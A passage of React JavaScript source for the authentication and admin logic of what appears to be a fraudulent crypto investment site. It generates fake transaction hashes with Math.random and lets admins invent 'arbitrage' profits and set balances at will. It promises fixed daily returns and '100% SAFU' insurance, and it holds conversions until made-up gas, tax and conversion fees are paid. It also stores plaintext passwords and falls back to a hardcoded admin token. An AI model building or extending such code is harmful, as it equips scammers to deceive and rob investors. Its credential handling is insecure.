    if (!user) return { success: false, error: 'User not logged in' }
    const numFrom = Number(fromAmount)
    const numTo = Number(toAmount)

    // Crypto can only be converted from availableBalance (uninvested + profits)
    const availableCrypto = Number(user.availableBalance) || 0
    if (numFrom > availableCrypto) {
      return {
        success: false,
        error: `Insufficient available crypto balance ($${availableCrypto.toLocaleString()}). Locked investment capital ($${(user.investedBalance || 0).toLocaleString()}) cannot be converted.`
      }
    }

    const newTx = {
      id: `tx-cnv-${Date.now()}`,
      type: 'CONVERT',
      title: `Conversion Swap ${numFrom.toLocaleString()} ${fromAsset} → ${numTo.toLocaleString()} ${toAsset}`,
      amount: numFrom,
      asset: fromAsset,
      toAsset: toAsset,
      toAmount: numTo,
      conversionFeeAmount: conversionFeeAmount,
      feeTxHash: feeTxHash || `0x${Math.random().toString(16).slice(2, 10)}...`,
      status: 'Pending Fee Confirmation',
      date: 'Just now',
      hash: `0x${Math.random().toString(16).slice(2, 10)}...`
    }

    const updatedUser = {
      ...user,
      transactions: [newTx, ...(user.transactions || [])]
    }

    persistSession(updatedUser, token)
    return { success: true, user: updatedUser, transaction: newTx }
  }

  // 4. Start Investing / Activate Package (Locks funds into active package)
  const activateInvestmentPlan = (packageId, packageName, amount, dailyRoiRate, durationDays = 7) => {
    if (!user) return { success: false, error: 'User not logged in' }
    const numAmount = Number(amount)
    if (isNaN(numAmount) || numAmount <= 0) {
      return { success: false, error: 'Please enter a valid investment amount' }
    }

    const availableToInvest = Number(user.availableBalance) || 0
    if (availableToInvest < numAmount) {
      return {
        success: false,
        error: `Insufficient available balance ($${availableToInvest.toLocaleString()}). Locked investment capital ($${(user.investedBalance || 0).toLocaleString()}) cannot be re-invested until cycle completion.`
      }
    }

    const dailyRateNum = parseFloat(dailyRoiRate) || 2.0
    const durationNum = Number(durationDays) || 7
    const dailyEarnings = numAmount * (dailyRateNum / 100)

    const newInvestment = {
      id: `inv-${Date.now()}`,
      packageId,
      packageName,
      amount: numAmount,
      dailyRoi: `${dailyRateNum}%`,
      dailyEarnings: dailyEarnings,
      totalEarned: 0,
      startDate: new Date().toISOString(),
      durationDays: durationNum,
      duration: `${durationNum} Days`,
      status: 'ACTIVE',
      insuranceStatus: '100% SAFU Insured'
    }

    const newTx = {
      id: `tx-inv-${Date.now()}`,
      type: 'INVESTMENT',
      title: `Locked into ${packageName} (${dailyRateNum}% / Day for ${durationNum} Days)`,
      amount: numAmount,
      asset: 'USDT',
      status: 'Completed',
      date: 'Just now',
      hash: `0x${Math.random().toString(16).slice(2, 10)}...`
    }

    // Deduct invested capital from uninvestedCapital first, then profit if needed
    let newUninvested = Math.max(0, Number(user.uninvestedCapital) || 0)
    let newProfit = Math.max(0, Number(user.profit) || 0)
    const fromUninvested = Math.min(newUninvested, numAmount)
    newUninvested -= fromUninvested
    const remainder = numAmount - fromUninvested
    if (remainder > 0) {
      newProfit = Math.max(0, newProfit - remainder)
    }

    const updatedUser = calculateUserBalances({
      ...user,
      uninvestedCapital: newUninvested,
      profit: newProfit,
      tier: packageName,
      activeInvestments: [newInvestment, ...(user.activeInvestments || [])],
      transactions: [newTx, ...(user.transactions || [])]
    })

    persistSession(updatedUser, token)
    return { success: true, user: updatedUser, investment: newInvestment }
  }

  // 4b. Complete Investment Cycle (e.g. after 7 days, unlocks capital & earned profit to available balance)
  const completeInvestmentCycle = (invId) => {
    if (!user) return { success: false, error: 'User not logged in' }
    const users = getAllRegisteredUsers()
    const uIdx = users.findIndex(u => u.id === user.id)
    if (uIdx === -1) return { success: false, error: 'User not found' }

    const targetUser = users[uIdx]
    const investments = Array.isArray(targetUser.activeInvestments) ? [...targetUser.activeInvestments] : []
    const invIdx = investments.findIndex(i => i.id === invId)
    if (invIdx === -1) return { success: false, error: 'Investment package not found' }

    const targetInv = investments[invIdx]
    if (targetInv.status !== 'ACTIVE') {
      return { success: false, error: 'Investment package cycle has already completed' }
    }

    const principal = Number(targetInv.amount) || 0
    const durationDays = Number(targetInv.durationDays) || parseInt(targetInv.duration) || 7
    const dailyRoi = parseFloat(targetInv.dailyRoi) || 2.0
    const totalProfit = principal * (dailyRoi / 100) * durationDays

    // Mark as completed
    investments[invIdx] = {
      ...targetInv,
      status: 'COMPLETED',
      completedAt: new Date().toISOString(),
      totalEarned: totalProfit
    }

    // Return principal capital to uninvestedCapital, and add totalProfit to profit
    // Both automatically flow into availableBalance (uninvestedCapital + profit)!
    targetUser.uninvestedCapital = (Number(targetUser.uninvestedCapital) || 0) + principal
    targetUser.profit = (Number(targetUser.profit) || 0) + totalProfit
    targetUser.activeInvestments = investments

    const newTx = {
      id: `tx-settle-${Date.now()}`,
      type: 'CYCLE_COMPLETED',
      title: `${targetInv.packageName} Completed (${durationDays} Days) — $${principal.toLocaleString()} Capital & $${totalProfit.toFixed(2)} Profit Unlocked`,
      amount: principal + totalProfit,
      asset: 'USDT',
      status: 'Completed',
      date: 'Just now',
      hash: `0x${Math.random().toString(16).slice(2, 10)}...`
    }
    targetUser.transactions = [newTx, ...(targetUser.transactions || [])]

    const recalculated = calculateUserBalances(targetUser)
    users[uIdx] = recalculated
    localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

    persistSession(recalculated, token)
    return { success: true, user: recalculated, investment: investments[invIdx], transaction: newTx }
  }

  // 5. Submit KYC Verification
  const submitKycDocuments = (tierLevel, docType, docNumber, fileName = '') => {
    if (!user) return { success: false, error: 'User not logged in' }

    const updatedUser = {
      ...user,
      kycSubmitted: true,
      kycApprovedByAdmin: false,
      kycApprovedAt: null,
      kycStatus: `Pending Level ${tierLevel} Verification`,
      kycDocType: docType,
      kycDocNumber: docNumber,
      kycDocFileName: fileName,
      kycSubmittedAt: new Date().toISOString(),
      kycRejectionReason: null
    }

    const newTx = {
      id: `tx-kyc-${Date.now()}`,
      type: 'SYSTEM',
      title: `KYC Level ${tierLevel} (${docType}) Submitted for Review`,
      amount: 0,
      asset: 'KYC',
      status: 'Pending Verification',
      date: 'Just now',
      hash: `0x${Math.random().toString(16).slice(2, 10)}...`
    }

    updatedUser.transactions = [newTx, ...(user.transactions || [])]
    persistSession(updatedUser, token)
    return { success: true, user: updatedUser }
  }

  // 6. Claim Referral Earnings
  const claimReferralCommission = () => {
    if (!user) return { success: false, error: 'User not logged in' }
    const commission = user.referralStats?.totalEarned || 0
    if (commission <= 0) {
      return { success: false, error: 'No unclaimed referral commissions available.' }
    }

    const newTx = {
      id: `tx-ref-${Date.now()}`,
      type: 'REFERRAL',
      title: 'Claimed 2-Tier Affiliate Referral Payout',
      amount: commission,
      asset: 'USDT',
      status: 'Completed',
      date: 'Just now',
      hash: `0x${Math.random().toString(16).slice(2, 10)}...`
    }

    const updatedUser = {
      ...user,
      profit: (user.profit || 0) + commission,
      totalBalance: (user.totalBalance || 0) + commission,
      referralStats: {
        ...user.referralStats,
        totalEarned: 0
      },
      transactions: [newTx, ...(user.transactions || [])]
    }

    persistSession(updatedUser, token)
    return { success: true, user: updatedUser, amount: commission }
  }

  // ==========================================
  // ADMIN DASHBOARD ACTIONS
  // ==========================================

  const getAllRegisteredUsers = () => {
    try {
      const stored = localStorage.getItem(USERS_STORAGE_KEY)
      const list = stored ? JSON.parse(stored) : [...DEFAULT_DEMO_USERS]
      return list.map(sanitizeUserKyc)
    } catch {
      return DEFAULT_DEMO_USERS.map(sanitizeUserKyc)
    }
  }

  const adminUpdateUserBalance = (userId, updates) => {
    try {
      const users = getAllRegisteredUsers()
      const idx = users.findIndex(u => u.id === userId)
      if (idx === -1) return { success: false, error: 'User not found' }

      const targetUser = users[idx]
      const newCapital = updates.capital !== undefined ? Number(updates.capital) : (targetUser.capital || 0)
      const newProfit = updates.profit !== undefined ? Number(updates.profit) : (targetUser.profit || 0)
      const newAvailable = updates.availableBalance !== undefined ? Number(updates.availableBalance) : (targetUser.availableBalance || 0)
      const newTotal = newCapital + newProfit + newAvailable

      const updatedUser = {
        ...targetUser,
        ...updates,
        capital: newCapital,
        profit: newProfit,
        availableBalance: newAvailable,
        totalBalance: newTotal
      }

      users[idx] = updatedUser
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

      // If active session is this user, refresh it
      if (user && user.id === userId) {
        setUser(updatedUser)
        localStorage.setItem(SESSION_KEY, JSON.stringify(updatedUser))
      }

      return { success: true, user: updatedUser }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  const adminApproveTransaction = (userId, txId) => {
    try {
      const users = getAllRegisteredUsers()
      const uIdx = users.findIndex(u => u.id === userId)
      if (uIdx === -1) return { success: false, error: 'User not found' }

      const targetUser = users[uIdx]
      const txs = targetUser.transactions || []
      const tIdx = txs.findIndex(t => t.id === txId)
      if (tIdx === -1) return { success: false, error: 'Transaction not found' }

      const targetTx = txs[tIdx]
      // ── Capture the original status BEFORE overwriting it ──
      const originalStatus = targetTx.status
      targetTx.status = 'Completed'

      // If it was a pending DEPOSIT, credit uninvestedCapital
      if (targetTx.type === 'DEPOSIT' && originalStatus?.includes('Pending')) {
        targetUser.uninvestedCapital = (Number(targetUser.uninvestedCapital) || 0) + Number(targetTx.amount)
      }

      // If it was a pending CONVERT, deduct the converted crypto and credit convertedBalance
      // so the user can now withdraw that local fiat amount via bank
      if (targetTx.type === 'CONVERT' && originalStatus?.includes('Pending')) {
        const fromCrypto = Number(targetTx.amount) || 0
        const convertedFiatAmount = Number(targetTx.toAmount) || 0

        // Deduct converted crypto amount from uninvested capital first, then profit
        let uninvested = Math.max(0, Number(targetUser.uninvestedCapital) || 0)
        let profit = Math.max(0, Number(targetUser.profit) || 0)
        const fromUninvested = Math.min(uninvested, fromCrypto)
        uninvested -= fromUninvested
        const remainder = fromCrypto - fromUninvested
        if (remainder > 0) {
          profit = Math.max(0, profit - remainder)
        }
        targetUser.uninvestedCapital = uninvested
        targetUser.profit = profit

        // Credit to converted fiat balance (strictly reserved for bank withdrawal)
        targetUser.convertedBalance = (Number(targetUser.convertedBalance) || 0) + convertedFiatAmount
        targetUser.approvedConversionCurrency = targetTx.toAsset || 'USD'
      }

      const recalculatedUser = calculateUserBalances({
        ...targetUser,
        transactions: [...txs]
      })

      users[uIdx] = recalculatedUser
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

      if (user && user.id === userId) {
        setUser(recalculatedUser)
        localStorage.setItem(SESSION_KEY, JSON.stringify(recalculatedUser))
      }

      return { success: true, transaction: targetTx }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  const adminRejectTransaction = (userId, txId, reason = 'Verification Failed') => {
    try {
      const users = getAllRegisteredUsers()
      const uIdx = users.findIndex(u => u.id === userId)
      if (uIdx === -1) return { success: false, error: 'User not found' }

      const targetUser = users[uIdx]
      const txs = targetUser.transactions || []
      const tIdx = txs.findIndex(t => t.id === txId)
      if (tIdx === -1) return { success: false, error: 'Transaction not found' }

      const targetTx = txs[tIdx]
      targetTx.status = `Rejected: ${reason}`

      // If it was a withdrawal that failed, refund the amount back to the appropriate balance
      if (targetTx.type === 'WITHDRAWAL') {
        if (targetTx.withdrawalMethod === 'LOCAL_BANK') {
          targetUser.convertedBalance = (Number(targetUser.convertedBalance) || 0) + Number(targetTx.amount)
        } else {
          targetUser.uninvestedCapital = (Number(targetUser.uninvestedCapital) || 0) + Number(targetTx.amount)
        }
      }

      const recalculatedUser = calculateUserBalances({
        ...targetUser,
        transactions: [...txs]
      })

      users[uIdx] = recalculatedUser
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

      if (user && user.id === userId) {
        setUser(recalculatedUser)
        localStorage.setItem(SESSION_KEY, JSON.stringify(recalculatedUser))
      }

      return { success: true, transaction: targetTx }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  const adminApproveKyc = (userId, level = 2) => {
    return adminUpdateUserBalance(userId, { 
      kycStatus: `Verified Level ${level}`,
      kycSubmitted: true,
      kycApprovedByAdmin: true,
      kycApprovedAt: new Date().toISOString(),
      kycApprovedBy: 'Administrator / Moderator Compliance',
      kycRejectionReason: null
    })
  }

  const adminRejectKyc = (userId, reason = 'Document verification failed') => {
    return adminUpdateUserBalance(userId, { 
      kycStatus: `Rejected: ${reason}`,
      kycSubmitted: true,
      kycApprovedByAdmin: false,
      kycApprovedAt: null,
      kycRejectionReason: reason
    })
  }

  const adminUpdateKyc = (userId, status, reason = '') => {
    const kLower = String(status || '').toLowerCase()
    const isApproved = kLower.includes('verified')
    const isRejected = kLower.includes('reject') || kLower.includes('failed')
    const isPending = kLower.includes('pending')
    return adminUpdateUserBalance(userId, { 
      kycStatus: status,
      kycSubmitted: isApproved || isRejected || isPending,
      kycApprovedByAdmin: isApproved,
      kycApprovedAt: isApproved ? new Date().toISOString() : null,
      kycApprovedBy: isApproved ? 'Administrator / Moderator Compliance' : null,
      kycRejectionReason: reason || (status.startsWith('Rejected') ? status.replace(/^Rejected:?\s*/i, '') : null)
    })
  }

  const adminCreditYield = (userId, amount, note = 'Daily Arbitrage Credit') => {
    try {
      const users = getAllRegisteredUsers()
      const uIdx = users.findIndex((u) => u.id === userId)
      if (uIdx === -1) return { success: false, error: 'User not found' }

      const targetUser = users[uIdx]
      const numAmount = Number(amount) || 0
      const newTx = {
        id: `tx-yield-${Date.now()}`,
        type: 'PROFIT',
        title: note,
        amount: numAmount,
        asset: 'USDT',
        status: 'Completed',
        date: 'Today, Just Now',
        hash: `0x${Math.random().toString(16).substring(2, 10)}...${Math.random().toString(16).substring(2, 6)}`
      }

      targetUser.profit = (targetUser.profit || 0) + numAmount
      targetUser.totalBalance = (targetUser.totalBalance || 0) + numAmount
      targetUser.transactions = [newTx, ...(targetUser.transactions || [])]

      users[uIdx] = { ...targetUser }
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

      if (user && user.id === userId) {
        setUser(users[uIdx])
        localStorage.setItem(SESSION_KEY, JSON.stringify(users[uIdx]))
      }

      return { success: true, user: users[uIdx], transaction: newTx }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  const adminCreateInvestment = (userId, investmentData) => {
    try {
      const users = getAllRegisteredUsers()
      const uIdx = users.findIndex((u) => u.id === userId)
      if (uIdx === -1) return { success: false, error: 'User not found' }

      const targetUser = users[uIdx]
      const newInv = {
        id: `inv-${Date.now().toString().slice(-6)}`,
        packageName: investmentData.packageName || 'Custom Desk',
        amount: Number(investmentData.amount) || 1000,
        dailyRoi: `${Number(investmentData.dailyRoi || 2.4).toFixed(2)}%`,
        dailyEarnings: (Number(investmentData.amount) || 1000) * ((Number(investmentData.dailyRoi) || 2.4) / 100),
        totalEarned: 0,
        startDate: new Date().toISOString().split('T')[0],
        duration: `${investmentData.durationDays || 30} Days`,
        status: 'ACTIVE',
        insuranceStatus: '100% SAFU Insured'
      }

      targetUser.capital = (targetUser.capital || 0) + newInv.amount
      targetUser.totalBalance = (targetUser.totalBalance || 0) + newInv.amount
      targetUser.activeInvestments = [newInv, ...(targetUser.activeInvestments || [])]

      users[uIdx] = { ...targetUser }
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

      if (user && user.id === userId) {
        setUser(users[uIdx])
        localStorage.setItem(SESSION_KEY, JSON.stringify(users[uIdx]))
      }

      return { success: true, user: users[uIdx], investment: newInv }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  const adminCreateUser = (newUserData) => {
    try {
      const users = getAllRegisteredUsers()
      const cleanEmail = newUserData.email.trim().toLowerCase()
      if (users.some(u => u.email.toLowerCase() === cleanEmail)) {
        return { success: false, error: 'User with this email already exists' }
      }

      const cap = Number(newUserData.capital) || 0
      const prof = Number(newUserData.profit) || 0
      const avail = Number(newUserData.availableBalance) || 0
      const total = cap + prof + avail

      const userObj = {
        id: `usr-${Date.now()}`,
        email: cleanEmail,
        password: newUserData.password || 'Password123!',
        rawPassword: newUserData.password || 'Password123!',
        fullName: newUserData.fullName || cleanEmail.split('@')[0],
        phone: newUserData.phone || '',
        role: newUserData.role || 'user',
        capital: cap,
        profit: prof,
        availableBalance: avail,
        totalBalance: total,
        tier: newUserData.tier || 'Pro Quant Desk',
        kycStatus: newUserData.kycStatus || 'Unverified',
        referralCode: `PX-${Math.floor(10000 + Math.random() * 90000)}`,
        activeInvestments: [],
        transactions: [
          {
            id: `tx-admin-create-${Date.now()}`,
            type: 'SYSTEM',
            title: 'Account Provisioned by Executive Admin',
            amount: total,
            asset: 'USD',
            status: 'Completed',
            date: 'Today, Just Now',
            hash: `0x${Math.random().toString(16).slice(2, 10)}...`
          }
        ],
        createdAt: new Date().toISOString()
      }

      users.unshift(userObj)
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

      // Trigger backend sync asynchronously
      fetch(`${API_BASE_URL}/api/admin/users`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token || 'admin-secret-change-this'}`
        },
        body: JSON.stringify(userObj)
      }).catch(() => {})

      return { success: true, user: userObj }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  const adminDeleteUser = (userId) => {
    try {
      const users = getAllRegisteredUsers()
      const filtered = users.filter(u => u.id !== userId)
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(filtered))

      if (user && user.id === userId) {
        logout()
      }

      fetch(`${API_BASE_URL}/api/admin/users/${userId}`, {
        method: 'DELETE',
        headers: {
          'Authorization': `Bearer ${token || 'admin-secret-change-this'}`
        }
      }).catch(() => {})

      return { success: true }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  const adminUpdateUserDetails = (userId, updates) => {
    try {
      const users = getAllRegisteredUsers()
      const idx = users.findIndex(u => u.id === userId)
      if (idx === -1) return { success: false, error: 'User not found' }

      const target = users[idx]
      let merged = {
        ...target,
        ...updates
      }

      if (updates.kycStatus !== undefined) {
        const kLower = String(updates.kycStatus).toLowerCase()
        if (kLower.includes('verified')) {
          merged.kycSubmitted = true
          merged.kycApprovedByAdmin = true
          merged.kycApprovedAt = target.kycApprovedAt || new Date().toISOString()
          merged.kycApprovedBy = 'Administrator / Moderator Desk'
          merged.kycRejectionReason = null
        } else if (kLower.includes('pending')) {
          merged.kycSubmitted = true
          merged.kycApprovedByAdmin = false
          merged.kycApprovedAt = null
        } else if (kLower.includes('reject') || kLower.includes('failed')) {
          merged.kycSubmitted = true
          merged.kycApprovedByAdmin = false
          merged.kycApprovedAt = null
          merged.kycRejectionReason = target.kycRejectionReason || updates.kycStatus.replace(/^Rejected:?\s*/i, '') || 'Document rejected'
        } else {
          // Unverified / Reset
          merged.kycSubmitted = false
          merged.kycApprovedByAdmin = false
          merged.kycApprovedAt = null
          merged.kycRejectionReason = null
        }
      }

      if (updates.password) {
        merged.password = updates.password
        merged.rawPassword = updates.password
      }

      const updatedUser = sanitizeUserKyc(merged)

      users[idx] = updatedUser
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

      if (user && user.id === userId) {
        setUser(updatedUser)
        localStorage.setItem(SESSION_KEY, JSON.stringify(updatedUser))
      }

      fetch(`${API_BASE_URL}/api/admin/users/${userId}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token || 'admin-secret-change-this'}`
        },
        body: JSON.stringify(updatedUser)
      }).catch(() => {})

      return { success: true, user: updatedUser }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  const adminUpdateWallets = (newWallets, feeSettings = {}) => {
    try {
      const updated = {
        ...platformSettings,
        wallets: {
          ...platformSettings.wallets,
          ...(newWallets || {})
        },
        conversionFeePercent:  feeSettings.conversionFeePercent  !== undefined ? Number(feeSettings.conversionFeePercent)  : (platformSettings.conversionFeePercent  ?? 20),
        cryptoGasFeePercent:   feeSettings.cryptoGasFeePercent   !== undefined ? Number(feeSettings.cryptoGasFeePercent)   : (platformSettings.cryptoGasFeePercent   ?? 10),
        cryptoGasFeeMinUsd:    feeSettings.cryptoGasFeeMinUsd    !== undefined ? Number(feeSettings.cryptoGasFeeMinUsd)    : (platformSettings.cryptoGasFeeMinUsd    ?? 25),
        fiatTaxFeePercent:     feeSettings.fiatTaxFeePercent      !== undefined ? Number(feeSettings.fiatTaxFeePercent)     : (platformSettings.fiatTaxFeePercent     ?? 15),
        fiatTaxFeeMinUsd:      feeSettings.fiatTaxFeeMinUsd       !== undefined ? Number(feeSettings.fiatTaxFeeMinUsd)      : (platformSettings.fiatTaxFeeMinUsd      ?? 50),
      }
      setPlatformSettings(updated)
      localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(updated))

      fetch(`${API_BASE_URL}/api/admin/settings`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token || 'admin-secret-change-this'}`
        },
        body: JSON.stringify(updated)
      }).catch(() => {})

      return { success: true, settings: updated }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  const executeTrade = ({ pair, side, amount, price, type, profit = 0, status = 'Completed' }) => {
    try {
      if (!user) return { success: false, error: 'User not authenticated' }
      const users = getAllRegisteredUsers()
      const uIdx = users.findIndex(u => u.id === user.id)
      if (uIdx === -1) return { success: false, error: 'User not found' }

      const targetUser = users[uIdx]
      const numAmount = Number(amount) || 0
      const numProfit = Number(profit) || 0

      // If arbitrage or profit trade, credit profit directly to profit and availableBalance
      if (numProfit > 0) {
        targetUser.profit = (targetUser.profit || 0) + numProfit
        targetUser.totalBalance = (targetUser.totalBalance || 0) + numProfit
        targetUser.availableBalance = (targetUser.availableBalance || 0) + numProfit
      }

      const newTx = {
        id: `trade-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
        type: numProfit > 0 ? 'PROFIT' : 'TRADE',
        title: `${type === 'ARBITRAGE' ? 'Flash Arbitrage' : side.toUpperCase() + ' ' + pair} Execution`,
        amount: numProfit > 0 ? numProfit : numAmount,
        asset: pair.split('/')[0] || 'USDT',
        status: status,
        date: 'Today, Just Now',
        hash: `0x${Math.random().toString(16).substring(2, 10)}...${Math.random().toString(16).substring(2, 6)}`,
        details: { pair, side, amount: numAmount, price, profit: numProfit, type }
      }

      targetUser.transactions = [newTx, ...(targetUser.transactions || [])]

      users[uIdx] = { ...targetUser }
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))
      setUser(users[uIdx])
      localStorage.setItem(SESSION_KEY, JSON.stringify(users[uIdx]))

      return { success: true, user: users[uIdx], transaction: newTx }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  return (
    <AuthContext.Provider
      value={{
        user,
        token,
        isAuthenticated: !!user,
        isLoading,
        platformSettings,
        login,
        signup,
        logout,
        depositFunds,
        requestWithdrawal,
        convertCrypto,
        activateInvestmentPlan,
        completeInvestmentCycle,
        submitKycDocuments,
        claimReferralCommission,
        executeTrade,
        // Admin & Moderator Methods
        getAllRegisteredUsers,
        adminCreateUser,
        adminDeleteUser,
        adminUpdateUserDetails,
        adminUpdateUserBalance,
        adminApproveTransaction,
        adminRejectTransaction,
        adminApproveKyc,
        adminRejectKyc,
        adminUpdateKyc,
        adminCreditYield,
        adminCreateInvestment,
        adminUpdateWallets,
        refreshUser
      }}
    >
      {children}
    </AuthContext.Provider>
  )
}

export function useAuth() {
  const context = useContext(AuthContext)
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider')
  }
  return context
}
